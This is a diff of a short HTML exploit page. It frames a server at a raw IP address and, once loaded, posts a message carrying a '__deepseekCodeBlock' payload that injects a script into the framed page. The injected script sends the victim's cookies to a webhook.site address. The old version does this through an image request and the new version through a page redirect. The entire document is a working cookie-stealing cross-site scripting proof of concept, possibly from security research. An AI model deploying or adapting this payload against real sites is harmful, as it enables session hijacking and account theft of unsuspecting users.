@@ -1,27 +1,17 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
-</head>
-<body>
-    <iframe 
-        width="600px" 
-        height="600px" 
-        src="http://103.130.211.150:19065/" 
-        id="targetFrame"
-        onload="exploit()">
-    </iframe>
+<iframe 
+    width="600px" 
+    height="600px" 
+    src="http://103.130.211.150:19065/" 
+    id="targetFrame"
+    onload="exploit()">
+</iframe>
 
-    <script>
-        function exploit() {
-            document.getElementById("targetFrame").contentWindow.postMessage({
-                __deepseekCodeBlock: `<script>
-                    new Image().src = 'https://webhook.site/42edc446-fdd6-448c-be3b-b11875dbbada?c=' + document.cookie;
-                </script>`
-            }, '*');
-        }
-    </script>
-</body>
-</html>
+<script>
+    function exploit() {
+        document.getElementById("targetFrame").contentWindow.postMessage({
+            __deepseekCodeBlock: `<script>
+                document.location = 'https://webhook.site/42edc446-fdd6-448c-be3b-b11875dbbada?c=' + document.cookie;
+            </script>`
+        }, '*');
+    }
+</script>
